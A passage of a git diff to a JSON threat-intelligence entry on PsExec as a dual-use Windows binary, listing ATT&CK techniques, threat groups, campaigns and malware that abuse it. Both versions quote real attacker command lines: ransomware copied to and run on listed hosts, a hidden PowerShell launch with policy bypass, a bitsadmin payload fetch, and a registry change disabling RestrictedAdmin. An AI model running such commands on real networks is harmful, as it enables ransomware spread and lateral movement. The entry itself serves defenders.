@@ -1,158 +1,937 @@
 {
   "type": "lolbin",
-  "version": 1,
+  "version": 2,
   "id": "44dd26a6-4c83-4fbe-9df3-ebf27693d193",
   "created_by_ref": "@Nounou_Mbeiri",
-  "created": "2023-10-14T00:00",
-  "modified": "2023-10-1417T00:00",
-  "name": "PsExec[.]exe",
+  "created": "2023-10-14T00:00:00.000Z",
+  "modified": "2026-10-16T00:00:00.000Z",
+  "name": "PsExec.exe",
+  "image": "psexec.exe",
   "description": "PsExec is a free Microsoft tool that can be used to execute a program on another computer. It is used by IT administrators and attackers.",
-  "Required_privilege": [
+  "attack": {
+    "id": "S0029",
+    "name": "PsExec",
+    "type": "software",
+    "url": "https://attack.mitre.org/software/S0029",
+    "version": "20.0"
+  },
+  "summary": [
+    "Remotely create accounts on target systems",
+    "Leverage Windows services to escalate privileges from administrator to SYSTEM",
+    "Download or upload a file over a network share",
+    "Writes programs to the ADMIN$ network share to execute commands on remote systems",
+    "Execute binaries on remote systems using a temporary Windows service"
+  ],
+  "required_privileges": [
     "User"
   ],
   "paths": [
     "C:\\SysinternalsSuite\\PsExec[.]exe",
     "C:\\.\\PsExec[.]exe"
   ],
-  "hashe": "27304B246C7D5B4E149124D5F93C5B01",
-  "associated_kill_chain_phases": [
-    "TA0002:Execution:T1569.002",
-    "TA0003:Persistence:T1136.002",
-    "TA0004:Privilege Escalation:T1543.003",
-    "TA0008:Lateral Movement:T1570",
-    "TA0008:Lateral Movement:T1021.002"
-  ],
+  "hashes": {
+    "MD5": "27304B246C7D5B4E149124D5F93C5B01"
+  },
   "capabilities": [
     "Alternate data streams",
     "Execute",
     "Download",
     "Upload"
   ],
-  "relationship": [
-    {
-      "associated_apts": [
-        "Naikon",
-        "APT39",
-        "Fox Kitten",
-        "Wizard Spider",
-        "Kimsuky",
-        "Turla",
-        "Cobalt Group",
-        "Sandworm Team",
-        "menuPass",
-        "Chimera",
-        "Dragonfly",
-        "Threat Group-1314",
-        "Moses Staff",
-        "Indrik Spider",
-        "GALLIUM",
-        "TEMP.Veles",
-        "FIN5",
-        "Carbanak",
-        "DarkVishnya",
-        "BlackTech",
-        "Leafminer",
-        "Thrip",
-        "OilRig",
-        "APT29",
-        "Cleaver",
-        "APT1",
-        "HAFNIUM",
-        "Magic Hound",
-        "FIN6"
-      ],
-      "Relationship Campaigns->Tool": [
-        "During [CostaRicto](https://attack.mitre.org/campaigns/C0004), threat actors used [PsExec](https://attack.mitre.org/software/S0029).(Citation: BlackBerry CostaRicto November 2020)",
-        "During [Operation Wocao](https://attack.mitre.org/campaigns/C0014), threat actors used [PsExec](https://attack.mitre.org/software/S0029) to interact with other systems inside the internal network.(Citation: FoxIT Wocao December 2019)",
-        "During [Night Dragon](https://attack.mitre.org/campaigns/C0002), threat actors used [PsExec](https://attack.mitre.org/software/S0029) to remotely execute droppers.(Citation: McAfee Night Dragon)",
-        "For [Operation Ghost](https://attack.mitre.org/campaigns/C0023), [APT29](https://attack.mitre.org/groups/G0016) used [PsExec](https://attack.mitre.org/software/S0029) for lateral movement on compromised networks.(Citation: ESET Dukes October 2019)"
-      ],
-      "associated_campaigns": [
-        "CostaRicto",
-        "Operation Wocao",
-        "Night Dragon",
-        "Operation Ghost"
-      ],
-      "Relationship APTs->Tool": [],
-      "associated_commands": [
-        "start PsExec[.]exe /accepteula @C:\\share$\\comps1.txt -u [REDACTED] -p [REDACTED] cmd /c COPY \\\"\\\\[REDACTED]\\share$\\vVv[.]exe\" \"C:\\windows\\temp\\vVv[.]exe\"",
-        "start PsExec[.]exe -d @C:\\share$\\comps1.txt -u [REDACTED] -p [REDACTED] cmd /c c:\\windows\\temp\\vVv[.]exe",
-        "C:\\psexec[.]exe @ip-list.txt -d cmd /c “(net use q: /delete /y &; net use q: \\\\DomainController\\DomainName /user:DomainName\\administrator ThisWasThePassword &; powershell -ExecutionPolicy ByPass -NoLogo -NoProfile -windowstyle hidden -NoExit -File q:\\P100119.ps1",
-        "psexec[.]exe  \\\\<IP ADDRESS> -u <DOMAIN>\\Administrator -p \\\"<PASSWORD>\\\" -s -d -h -r mstdc -accepteula -nobanner c:\\windows\\temp\\ttsel[.]exe",
-        "psexec \\\\<redacted> -u <redacted>\\<redacted> -p <redacted> reg add \\\"hklm\\system\\currentcontrolset\\control\\lsa\\\" /f /v DisableRestrictedAdmin /t REG_DWORD /d 0"
-      ],
-      "pre_and_next_related_cmd": [
-        {
-          "pre_cmd_event": [
-            "start wmic /node:@C:\\share$\\comps1.txt /user:[REDACTED] /password:[REDACTED] process call create \\\"cmd[.]exe /c bitsadmin /transfer vVv \\\\[REDACTED]\\share$\\vVv[.]exe %APPDATA%\\vVv[.]exe & %APPDATA%\\vVv[.]exe",
-            "C:\\Windows\\system32\\cmd[.]exe /K copy ttsel[.]exe \\\\<IP>\\c$\\windows\\temp\\"
-          ],
-          "next_cmd_event": []
-        }
-      ]
-    }
-  ],
   "platforms": [
     "windows"
   ],
-  "detections": [
+  "associated_kill_chain_phases": [
+    "TA0003:Persistence:T1543.003",
+    "TA0004:Privilege Escalation:T1543.003",
+    "TA0003:Persistence:T1136.002",
+    "TA0002:Execution:T1569.002",
+    "TA0008:Lateral Movement:T1570",
+    "TA0008:Lateral Movement:T1021.002"
+  ],
+  "relationship": {
+    "associated_apts": [
+      {
+        "name": "Akira",
+        "attack_id": "G1024",
+        "evidence": "uses S0029"
+      },
+      {
+        "name": "APT1",
+        "attack_id": "G0006",
+        "evidence": "uses S0029"
+      },
+      {
+        "name": "APT29",
+        "attack_id": "G0016",
+        "evidence": "uses S0029"
+      },
+      {
+        "name": "APT39",
+        "attack_id": "G0087",
+        "evidence": "uses S0029"
+      },
+      {
+        "name": "BlackByte",
+        "attack_id": "G1043",
+        "evidence": "uses S0029; names psexec.exe",
+        "description": "BlackByte has used PsExec to remotely execute payloads during wormable ransomware execution.",
+        "sources": "Microsoft BlackByte 2023 https://www.microsoft.com/en-us/security/blog/2023/07/06/the-five-day-job-a-blackbyte-ransomware-intrusion-case-study/"
+      },
+      {
+        "name": "BlackTech",
+        "attack_id": "G0098",
+        "evidence": "uses S0029; names psexec.exe",
+        "description": "BlackTech has obtained and used tools such as Putty, SNScan, and PsExec for its operations.",
+        "sources": "Symantec Palmerworm Sep 2020 https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/palmerworm-blacktech-espionage-apt"
+      },
+      {
+        "name": "Carbanak",
+        "attack_id": "G0008",
+        "evidence": "uses S0029; names psexec.exe",
+        "description": "Carbanak has obtained and used open-source tools such as PsExec and Mimikatz.",
+        "sources": "Kaspersky Carbanak https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08064518/Carbanak_APT_eng.pdf"
+      },
+      {
+        "name": "Chimera",
+        "attack_id": "G0114",
+        "evidence": "uses S0029; names psexec.exe",
+        "description": "Chimera has obtained and used tools such as BloodHound, Cobalt Strike, Mimikatz, and PsExec. Chimera has used PsExec to deploy beacons on compromised systems.",
+        "sources": "Cycraft Chimera April 2020 https://web.archive.org/web/20231214094657/https://cycraft.com/download/CyCraft-Whitepaper-Chimera_V4.1.pdf; NCC Group Chimera January 2021 https://web.archive.org/web/20230218064220/https://research.nccgroup.com/2021/01/12/abusing-cloud-services-to-fly-under-the-radar/"
+      },
+      {
+        "name": "Cleaver",
+        "attack_id": "G0003",
+        "evidence": "uses S0029; names psexec.exe",
+        "description": "Cleaver has obtained and used open-source tools such as PsExec, Windows Credential Editor, and Mimikatz.",
+        "sources": "Cylance Cleaver https://web.archive.org/web/20200302085133/https://www.cylance.com/content/dam/cylance/pages/operation-cleaver/Cylance_Operation_Cleaver_Report.pdf"
+      },
+      {
+        "name": "Cobalt Group",
+        "attack_id": "G0080",
+        "evidence": "uses S0029; names psexec.exe",
+        "description": "Cobalt Group has obtained and used a variety of tools including Mimikatz, PsExec, Cobalt Strike, and SDelete.",
+        "sources": "PTSecurity Cobalt Dec 2016 https://www.ptsecurity.com/upload/corporate/ww-en/analytics/Cobalt-Snatch-eng.pdf"
+      },
+      {
+        "name": "DarkVishnya",
+        "attack_id": "G0105",
+        "evidence": "uses S0029; names psexec.exe",
+        "description": "DarkVishnya has obtained and used tools such as Impacket, Winexe, and PsExec.",
+        "sources": "Securelist DarkVishnya Dec 2018 https://securelist.com/darkvishnya/89169/"
+      },
+      {
+        "name": "Dragonfly",
+        "attack_id": "G0035",
+        "evidence": "uses S0029; names psexec.exe",
+        "description": "Dragonfly has obtained and used tools such as Mimikatz, CrackMapExec, and PsExec.",
+        "sources": "Secureworks IRON LIBERTY July 2019 https://www.secureworks.com/research/resurgent-iron-liberty-targeting-energy-sector"
+      },
+      {
+        "name": "Ember Bear",
+        "attack_id": "G1003",
+        "evidence": "uses S0029; names psexec.exe",
+        "description": "Ember Bear has used PsExec through frameworks such as Impacket for remote command execution.",
+        "sources": "CISA GRU29155 2024 https://www.cisa.gov/sites/default/files/2024-09/aa24-249a-russian-military-cyber-actors-target-us-and-global-critical-infrastructure.pdf"
+      },
+      {
+        "name": "FIN5",
+        "attack_id": "G0053",
+        "evidence": "uses S0029; names psexec.exe",
+        "description": "FIN5 uses a customized version of PsExec. FIN5 has obtained and used a customized version of PsExec, as well as use other tools such as pwdump, SDelete, and Windows Credential Editor.",
+        "sources": "Mandiant FIN5 GrrCON Oct 2016 https://www.youtube.com/watch?v=fevGZs0EQu8"
+      },
+      {
+        "name": "FIN6",
+        "attack_id": "G0037",
+        "evidence": "uses S0029; names psexec.exe",
+        "description": "FIN6 has renamed the \"psexec\" service name to \"mstdc\" to masquerade as a legitimate Windows service. FIN6 has used Metasploit’s PsExec NTDSGRAB module to obtain a copy of the victim's Active Directory database.",
+        "sources": "FireEye FIN6 Apr 2019 https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html; FireEye FIN6 April 2016 https://web.archive.org/web/20190807112824/https://www2.fireeye.com/rs/848-DID-242/images/rpt-fin6.pdf"
+      },
+      {
+        "name": "FIN8",
+        "attack_id": "G0061",
+        "evidence": "uses S0029"
+      },
+      {
+        "name": "Fox Kitten",
+        "attack_id": "G0117",
+        "evidence": "uses S0029; names psexec.exe",
+        "description": "Fox Kitten has downloaded additional tools including PsExec directly to endpoints.",
+        "sources": "CISA AA20-259A Iran-Based Actor September 2020 https://us-cert.cisa.gov/ncas/alerts/aa20-259a"
+      },
+      {
+        "name": "GALLIUM",
+        "attack_id": "G0093",
+        "evidence": "uses S0029; names psexec.exe",
+        "description": "GALLIUM has used PsExec to move laterally between hosts in the target network.",
+        "sources": "Microsoft GALLIUM December 2019 https://www.microsoft.com/security/blog/2019/12/12/gallium-targeting-global-telecom/"
+      },
+      {
+        "name": "HAFNIUM",
+        "attack_id": "G0125",
+        "evidence": "uses S0029"
+      },
+      {
+        "name": "INC Ransom",
+        "attack_id": "G1032",
+        "evidence": "uses S0029; names psexec.exe",
+        "description": "INC Ransom has named a PsExec executable winupd to mimic a legitimate Windows update file. INC Ransom has acquired and used several tools including MegaSync, AnyDesk, esentutl and PsExec.",
+        "sources": "SOCRadar INC Ransom January 2024 https://socradar.io/dark-web-profile-inc-ransom/; Huntress INC Ransom Group August 2023 https://www.huntress.com/blog/investigating-new-inc-ransom-group-activity; Huntress INC Ransomware May 2024 https://www.huntress.com/blog/lolbin-to-inc-ransomware; Cybereason INC Ransomware November 2023 https://web.archive.org/web/20231202022946/https://www.cybereason.com/hubfs/dam/collateral/reports/threat-alert-inc-ransomware.pdf; SentinelOne INC Ransomware https://www.sentinelone.com/anthology/inc-ransom/"
+      },
+      {
+        "name": "Indrik Spider",
+        "attack_id": "G0119",
+        "evidence": "uses S0029; names psexec.exe",
+        "description": "Indrik Spider used PsExec to leverage Windows Defender to disable scanning of all downloaded files and to restrict real-time monitoring. Indrik Spider has used `MpCmdRun` to revert the definitions in Microsoft Defender. Additionally, Indrik Spider has used WMI to stop or uninstall and reset anti-virus products and other defensive services. Indrik Spider has used PsExec to stop services prior to the execution of ransomware. Indrik Spider has encrypted domain-controlled systems using BitPaymer. Additionally, Indrik Spider used PsExec to execute a ransomware script.",
+        "sources": "Mandiant_UNC2165 https://cloud.google.com/blog/topics/threat-intelligence/unc2165-shifts-to-evade-sanctions/; Symantec WastedLocker June 2020 https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/wastedlocker-ransomware-us; Crowdstrike Indrik November 2018 https://www.crowdstrike.com/blog/big-game-hunting-the-evolution-of-indrik-spider-from-dridex-wire-fraud-to-bitpaymer-targeted-ransomware/"
+      },
+      {
+        "name": "Kimsuky",
+        "attack_id": "G0094",
+        "evidence": "uses S0029; names psexec.exe",
+        "description": "Kimsuky has obtained and used tools such as Nirsoft WebBrowserPassVIew, Mimikatz, and PsExec.",
+        "sources": "Talos Kimsuky Nov 2021 https://blog.talosintelligence.com/2021/11/kimsuky-abuses-blogs-delivers-malware.html; Netscout Stolen Pencil Dec 2018 https://asert.arbornetworks.com/stolen-pencil-campaign-targets-academia/; Mandiant APT43 March 2024 https://services.google.com/fh/files/misc/apt43-report-en.pdf"
+      },
+      {
+        "name": "Leafminer",
+        "attack_id": "G0077",
+        "evidence": "uses S0029; names psexec.exe",
+        "description": "Leafminer has obtained and used tools such as LaZagne, Mimikatz, PsExec, and MailSniper.",
+        "sources": "Symantec Leafminer July 2018 https://www.symantec.com/blogs/threat-intelligence/leafminer-espionage-middle-east"
+      },
+      {
+        "name": "Magic Hound",
+        "attack_id": "G0059",
+        "evidence": "uses S0029"
+      },
+      {
+        "name": "Medusa Group",
+        "attack_id": "G1051",
+        "evidence": "uses S0029; names psexec.exe",
+        "description": "Medusa Group has utilized PsExec to facilitate execution, lateral movement, defense evasion, and exfiltration. Medusa Group has terminated antivirus services utilizing the gaze.exe executable and utilizing `psexec.exe`. Medusa Group has also leveraged I/O control codes (IOCTLs) for terminating and deleting processes of identified security tools. Medusa Group has utilized PsExec to execute scripts and commands within victim environments. Medusa Group has also used the Windows service RoboCopy to search and copy data for exfiltration. Medusa Group has utilized compromised legitimate local and domain accounts within the victim environment to facilitate remote access and lateral movement sometimes in combination with PsExec. Medusa Group has utilized PsExec to execute batch scripts that modify firewall settings. Medusa Group has also enabled and modified firewall rules to allow for RDP connections for lateral movement and device interactions. Medusa Group has utilized PsExec to execute `quser` to discover the user session information.",
+        "sources": "CISA Medusa Group Medusa Ransomware March 2025 https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a; Palo Alto Unit 42 Medusa Group Medusa Ransomware January 2024 https://unit42.paloaltonetworks.com/medusa-ransomware-escalation-new-leak-site/; Broadcom Medusa Ransomware Medusa Group March 2025 https://www.security.com/threat-intelligence/medusa-ransomware-attacks"
+      },
+      {
+        "name": "menuPass",
+        "attack_id": "G0045",
+        "evidence": "uses S0029"
+      },
+      {
+        "name": "Moses Staff",
+        "attack_id": "G1009",
+        "evidence": "uses S0029"
+      },
+      {
+        "name": "Naikon",
+        "attack_id": "G0019",
+        "evidence": "uses S0029"
+      },
+      {
+        "name": "OilRig",
+        "attack_id": "G0049",
+        "evidence": "uses S0029"
+      },
+      {
+        "name": "Play",
+        "attack_id": "G1040",
+        "evidence": "uses S0029"
+      },
+      {
+        "name": "Sandworm Team",
+        "attack_id": "G0034",
+        "evidence": "uses S0029"
+      },
+      {
+        "name": "Silence",
+        "attack_id": "G0091",
+        "evidence": "names psexec.exe",
+        "description": "Silence has obtained and modified versions of publicly-available tools like Empire and PsExec.",
+        "sources": "Group IB Silence Aug 2019 https://www.group-ib.com/resources/threat-research/silence_2.0.going_global.pdf; SecureList Silence Nov 2017 https://securelist.com/the-silence/83009/"
+      },
+      {
+        "name": "Storm-1811",
+        "attack_id": "G1046",
+        "evidence": "uses S0029; names psexec.exe",
+        "description": "Storm-1811 has used PsExec for remote process execution.",
+        "sources": "Microsoft Storm-1811 2024 https://www.microsoft.com/en-us/security/blog/2024/05/15/threat-actors-misusing-quick-assist-in-social-engineering-attacks-leading-to-ransomware/"
+      },
+      {
+        "name": "TEMP.Veles",
+        "attack_id": "G0088",
+        "evidence": "uses S0029"
+      },
+      {
+        "name": "The Gentlemen",
+        "attack_id": "G1058",
+        "evidence": "uses S0029"
+      },
+      {
+        "name": "Threat Group-1314",
+        "attack_id": "G0028",
+        "evidence": "uses S0029"
+      },
+      {
+        "name": "Thrip",
+        "attack_id": "G0076",
+        "evidence": "uses S0029; names psexec.exe",
+        "description": "Thrip used PsExec to move laterally between computers on the victim’s network. Thrip has obtained and used tools such as Mimikatz and PsExec.",
+        "sources": "Symantec Thrip June 2018 https://www.symantec.com/blogs/threat-intelligence/thrip-hits-satellite-telecoms-defense-targets"
+      },
+      {
+        "name": "Turla",
+        "attack_id": "G0010",
+        "evidence": "uses S0029"
+      },
+      {
+        "name": "Volt Typhoon",
+        "attack_id": "G1017",
+        "evidence": "uses S0029"
+      },
+      {
+        "name": "Wizard Spider",
+        "attack_id": "G0102",
+        "evidence": "uses S0029; names psexec.exe",
+        "description": "Wizard Spider has used `services.exe` to execute scripts and executables during lateral movement within a victim's network. Wizard Spider has also used batch scripts that leverage PsExec to execute a previously transferred ransomware payload on a victim's network.",
+        "sources": "Mandiant FIN12 Oct 2021 https://web.archive.org/web/20220313061955/https://www.mandiant.com/sites/default/files/2021-10/fin12-group-profile.pdf; DFIR Ryuk in 5 Hours October 2020 https://thedfirreport.com/2020/10/18/ryuk-in-5-hours/; DFIR Ryuk's Return October 2020 https://thedfirreport.com/2020/10/08/ryuks-return/"
+      }
+    ],
+    "associated_campaigns": [
+      {
+        "name": "2025 Poland Wiper Attacks",
+        "attack_id": "C0063",
+        "evidence": "uses S0029; names psexec.exe",
+        "description": "During the 2025 Poland Wiper Attacks, the adversaries used PsExec to execute programs on target machines. During the 2025 Poland Wiper Attacks, the adversaries leveraged PsExec to run `cmd.exe` commands on multiple victim machines.",
+        "sources": "CERT Polska https://cert.pl/uploads/docs/CERT_Polska_Energy_Sector_Incident_Report_2025.pdf"
+      },
+      {
+        "name": "C0032",
+        "attack_id": "C0032",
+        "evidence": "names psexec.exe",
+        "description": "During the C0032 campaign, TEMP.Veles obtained and used tools such as Mimikatz and PsExec.",
+        "sources": "FireEye TRITON 2019 https://www.fireeye.com/blog/threat-research/2019/04/triton-actor-ttp-profile-custom-attack-tools-detections.html"
+      },
+      {
+        "name": "CostaRicto",
+        "attack_id": "C0004",
+        "evidence": "uses S0029; names psexec.exe",
+        "description": "During CostaRicto, threat actors used PsExec.",
+        "sources": "BlackBerry CostaRicto November 2020 https://blogs.blackberry.com/en/2020/11/the-costaricto-campaign-cyber-espionage-outsourced"
+      },
+      {
+        "name": "Night Dragon",
+        "attack_id": "C0002",
+        "evidence": "uses S0029; names psexec.exe",
+        "description": "During Night Dragon, threat actors used PsExec to remotely execute droppers.",
+        "sources": "McAfee Night Dragon https://scadahacker.com/library/Documents/Cyber_Events/McAfee%20-%20Night%20Dragon%20-%20Global%20Energy%20Cyberattacks.pdf"
+      },
+      {
+        "name": "Operation Ghost",
+        "attack_id": "C0023",
+        "evidence": "uses S0029; names psexec.exe",
+        "description": "For Operation Ghost, APT29 used PsExec for lateral movement on compromised networks.",
+        "sources": "ESET Dukes October 2019 https://www.welivesecurity.com/wp-content/uploads/2019/10/ESET_Operation_Ghost_Dukes.pdf"
+      },
+      {
+        "name": "Operation Wocao",
+        "attack_id": "C0014",
+        "evidence": "uses S0029; names psexec.exe",
+        "description": "During Operation Wocao, threat actors used PsExec to interact with other systems inside the internal network. During Operation Wocao, threat actors used `smbexec.py` and `psexec.py` from Impacket for lateral movement.",
+        "sources": "FoxIT Wocao December 2019 https://www.fox-it.com/media/kadlze5c/201912_report_operation_wocao.pdf"
+      },
+      {
+        "name": "SharePoint ToolShell Exploitation",
+        "attack_id": "C0058",
+        "evidence": "uses S0029; names psexec.exe",
+        "description": "During SharePoint ToolShell Exploitation, threat actors leveraged tools including Impacket, PsExec, and Mimikatz. During SharePoint ToolShell Exploitation, threat actors leveraged PsExec for command execution and used `services.exe` to disable Microsoft Defender via Registry keys.",
+        "sources": "Microsoft SharePoint Exploit JUL 2025 https://www.microsoft.com/en-us/security/blog/2025/07/22/disrupting-active-exploitation-of-on-premises-sharepoint-vulnerabilities/#storm-2603"
+      }
+    ],
+    "associated_malware": [
+      {
+        "name": "BlackCat",
+        "attack_id": "S1068",
+        "evidence": "names psexec.exe",
+        "description": "BlackCat can replicate itself across connected servers via `psexec`.",
+        "sources": "Microsoft BlackCat Jun 2022 https://www.microsoft.com/en-us/security/blog/2022/06/13/the-many-lives-of-blackcat-ransomware/"
+      },
+      {
+        "name": "BlackEnergy",
+        "attack_id": "S0089",
+        "evidence": "names psexec.exe",
+        "description": "BlackEnergy has run a plug-in on a victim to spread through the local network by using PsExec and accessing admin shares.",
+        "sources": "Securelist BlackEnergy Nov 2014 https://securelist.com/be2-custom-plugins-router-abuse-and-target-profiles/67353/"
+      },
+      {
+        "name": "Cobalt Strike",
+        "attack_id": "S0154",
+        "evidence": "names psexec.exe",
+        "description": "Cobalt Strike can use PsExec to execute a payload on a remote host. It can also use Service Control Manager to start new services.",
+        "sources": "Cobalt Strike TTPs Dec 2017 https://web.archive.org/web/20210924171429/https://www.cobaltstrike.com/downloads/reports/tacticstechniquesandprocedures.pdf; cobaltstrike manual https://web.archive.org/web/20210825130434/https://cobaltstrike.com/downloads/csmanual38.pdf; Cobalt Strike Manual 4.3 November 2020 https://web.archive.org/web/20210708035426/https://www.cobaltstrike.com/downloads/csmanual43.pdf"
+      },
+      {
+        "name": "DarkGate",
+        "attack_id": "S1111",
+        "evidence": "names psexec.exe",
+        "description": "DarkGate tries to elevate privileges to SYSTEM using PsExec to locally execute as a service, such as cmd /c c:\\temp\\PsExec.exe -accepteula -j -d -s [Target Binary].",
+        "sources": "Trellix Darkgate 2023 https://www.trellix.com/blogs/research/the-continued-evolution-of-the-darkgate-malware-as-a-service/"
+      },
+      {
+        "name": "GreyEnergy",
+        "attack_id": "S0342",
+        "evidence": "names psexec.exe",
+        "description": "GreyEnergy uses PsExec locally in order to execute rundll32.exe at the highest privileges (NTAUTHORITY\\SYSTEM).",
+        "sources": "ESET GreyEnergy Oct 2018 https://www.welivesecurity.com/wp-content/uploads/2018/10/ESET_GreyEnergy.pdf"
+      },
+      {
+        "name": "Lizar",
+        "attack_id": "S0681",
+        "evidence": "names psexec.exe",
+        "description": "FIN7 has obtained and used tools such as Impacket, Mimikatz, and PsExec.",
+        "sources": "BiZone Lizar May 2021 https://bi-zone.medium.com/from-pentest-to-apt-attack-cybercriminal-group-fin7-disguises-its-malware-as-an-ethical-hackers-c23c9a75e319"
+      },
+      {
+        "name": "LockBit 3.0",
+        "attack_id": "S1202",
+        "evidence": "names psexec.exe",
+        "description": "LockBit 3.0 can use PsExec to execute commands and payloads.",
+        "sources": "Joint Cybersecurity Advisory LockBit JUN 2023 https://www.cisa.gov/sites/default/files/2023-06/aa23-165a_understanding_TA_LockBit_0.pdf"
+      },
+      {
+        "name": "Net Crawler",
+        "attack_id": "S0056",
+        "evidence": "names psexec.exe",
+        "description": "Net Crawler uses PsExec to perform remote service manipulation to execute a copy of itself as part of lateral movement.",
+        "sources": "Cylance Cleaver https://web.archive.org/web/20200302085133/https://www.cylance.com/content/dam/cylance/pages/operation-cleaver/Cylance_Operation_Cleaver_Report.pdf"
+      },
+      {
+        "name": "Netwalker",
+        "attack_id": "S0457",
+        "evidence": "names psexec.exe",
+        "description": "Operators deploying Netwalker have used psexec and certutil to retrieve the Netwalker payload. Operators deploying Netwalker have used psexec to copy the Netwalker payload across accessible systems.",
+        "sources": "Sophos Netwalker May 2020 https://news.sophos.com/en-us/2020/05/27/netwalker-ransomware-tools-give-insight-into-threat-actor/"
+      },
+      {
+        "name": "NotPetya",
+        "attack_id": "S0368",
+        "evidence": "names psexec.exe",
+        "description": "NotPetya can use PsExec to help propagate itself across a network. NotPetya drops PsExec with the filename dllhost.dat. NotPetya can use PsExec, which interacts with the ADMIN$ network share to execute commands on remote systems. NotPetya can use valid credentials with PsExec or wmic to spread itself to remote systems. NotPetya uses rundll32.exe to install itself on remote systems when accessed via PsExec or wmic.",
+        "sources": "Talos Nyetya June 2017 https://blog.talosintelligence.com/2017/06/worldwide-ransomware-variant.html; US-CERT NotPetya 2017 https://www.us-cert.gov/ncas/alerts/TA17-181A; PsExec Russinovich http://windowsitpro.com/systems-management/psexec"
+      },
+      {
+        "name": "Olympic Destroyer",
+        "attack_id": "S0365",
+        "evidence": "names psexec.exe",
+        "description": "Olympic Destroyer utilizes PsExec to help propagate itself across a network. Olympic Destroyer uses PsExec to interact with the ADMIN$ network share to execute commands on remote systems. Olympic Destroyer contains a module that tries to obtain credentials from LSASS, similar to Mimikatz. These credentials are used with PsExec and Windows Management Instrumentation to help the malware propagate itself across a network.",
+        "sources": "Talos Olympic Destroyer 2018 https://blog.talosintelligence.com/2018/02/olympic-destroyer.html; PsExec Russinovich http://windowsitpro.com/systems-management/psexec"
+      },
+      {
+        "name": "Pysa",
+        "attack_id": "S0583",
+        "evidence": "names psexec.exe",
+        "description": "Pysa has used PsExec to copy and execute the ransomware.",
+        "sources": "CERT-FR PYSA April 2020 https://www.cert.ssi.gouv.fr/uploads/CERTFR-2020-CTI-003.pdf"
+      },
+      {
+        "name": "Qilin",
+        "attack_id": "S1242",
+        "evidence": "names psexec.exe",
+        "description": "Qilin can embed a copy of PsExec within its payload and place it in the %Temp% directory under a randomly generated filename. Qilin has run `cmd /C [PsExec] -accepteula \\IP Address -c -f -h -d -i C:\\Users\\xxx\\<encryptor_1>.exe --password [PASSWORD] --spread --spread-process` to execute its encryptor to target multiple network shares. Qilin has used PsExec to distribute a second encryptor, named encryptor_1.exe, across the targeted environment.",
+        "sources": "Picus Qilin MAR 2025 https://www.picussecurity.com/resource/blog/qilin-ransomware; Cisco Talos Qilin Ransomware OCT 2025 https://blog.talosintelligence.com/uncovering-qilin-attack-methods-exposed-through-multiple-cases/"
+      },
+      {
+        "name": "Shamoon",
+        "attack_id": "S0140",
+        "evidence": "names psexec.exe",
+        "description": "Shamoon creates a new service named “ntssrv” to execute the payload. Shamoon can also spread via PsExec.",
+        "sources": "Palo Alto Shamoon Nov 2016 http://researchcenter.paloaltonetworks.com/2016/11/unit42-shamoon-2-return-disttrack-wiper/; McAfee Shamoon December19 2018 https://www.mcafee.com/blogs/other-blogs/mcafee-labs/shamoon-attackers-employ-new-tool-kit-to-wipe-infected-systems/"
+      },
+      {
+        "name": "The Gentlemen Ransomware",
+        "attack_id": "S9051",
+        "evidence": "names psexec.exe",
+        "description": "The Gentlemen Ransomware has copied malware executables, such as PsExec.exe, to the local `C:\\Temp` directory. The Gentlemen Ransomware had also enabled a hidden SMB share pointed at the `C:\\Temp` folder to allow anonymous access. The Gentlemen Ransomware has also consolidated data in `C:\\ProgramData\\data\\`.",
+        "sources": "CarveyODonnellWelchHuntress_TheGentlemen_May2026 https://www.huntress.com/blog/the-gentlemen-ransomware-defense-evasion-ttps; CheckPointResearch_TheGentlemen_April2026 https://research.checkpoint.com/2026/dfir-report-the-gentlemen/; MSTI_GentelmenRansomware_May2026 https://www.microsoft.com/en-us/security/blog/2026/05/28/the-gentlemen-ransomware-dissecting-a-self-propagating-go-encryptor/; TrendAI_TheGentlemen_Sept2025 https://www.trendaisecurity.com/en-us/resources-insights/trendai-security-blog/unmasking-the-gentlemen-ransomware"
+      }
+    ],
+    "associated_tools": [
+      {
+        "name": "Empire",
+        "attack_id": "S0363",
+        "evidence": "names psexec.exe",
+        "description": "Empire can use PsExec to execute a payload on a remote host.",
+        "sources": "Github PowerShell Empire https://github.com/PowerShellEmpire/Empire"
+      },
+      {
+        "name": "Impacket",
+        "attack_id": "S0357",
+        "evidence": "names psexec.exe",
+        "description": "Impacket contains various modules emulating other service execution tools such as PsExec.",
+        "sources": "Impacket Tools https://www.secureauth.com/labs/open-source-tools/impacket"
+      },
+      {
+        "name": "Koadic",
+        "attack_id": "S0250",
+        "evidence": "names psexec.exe",
+        "description": "Koadic can run a command on another machine using PsExec.",
+        "sources": "Github Koadic https://github.com/offsecginger/koadic"
+      },
+      {
+        "name": "PoshC2",
+        "attack_id": "S0378",
+        "evidence": "names psexec.exe",
+        "description": "PoshC2 contains an implementation of PsExec for remote execution.",
+        "sources": "GitHub PoshC2 https://github.com/nettitude/PoshC2_Python"
+      },
+      {
+        "name": "Pupy",
+        "attack_id": "S0192",
+        "evidence": "names psexec.exe",
+        "description": "Pupy uses PsExec to execute a payload or commands on a remote host.",
+        "sources": "GitHub Pupy https://github.com/n1nj4sec/pupy"
+      }
+    ],
+    "technique_only": [
+      {
+        "name": "Lotus Blossom",
+        "attack_id": "G0030",
+        "evidence": "uses technique T1543.003 (v1 research)"
+      }
+    ],
+    "associated_commands": [
+      {
+        "command": "start PsExec[.]exe /accepteula @C:\\share$\\comps1.txt -u [REDACTED] -p [REDACTED] cmd /c COPY \\\"\\\\[REDACTED]\\share$\\vVv[.]exe\" \"C:\\windows\\temp\\vVv[.]exe\"",
+        "intent": "Ryuk deployment: copy the ransomware from a share to every host listed in comps1.txt.",
+        "status": "verified",
+        "source_name": "FireEye KEGTAP SINGLEMALT October 2020",
+        "source_url": "https://www.fireeye.com/blog/threat-research/2020/10/kegtap-and-singlemalt-with-a-ransomware-chaser.html"
+      },
+      {
+        "command": "start PsExec[.]exe -d @C:\\share$\\comps1.txt -u [REDACTED] -p [REDACTED] cmd /c c:\\windows\\temp\\vVv[.]exe",
+        "intent": "Ryuk deployment: run the copied ransomware on every host in the list.",
+        "status": "verified",
+        "source_name": "FireEye KEGTAP SINGLEMALT October 2020",
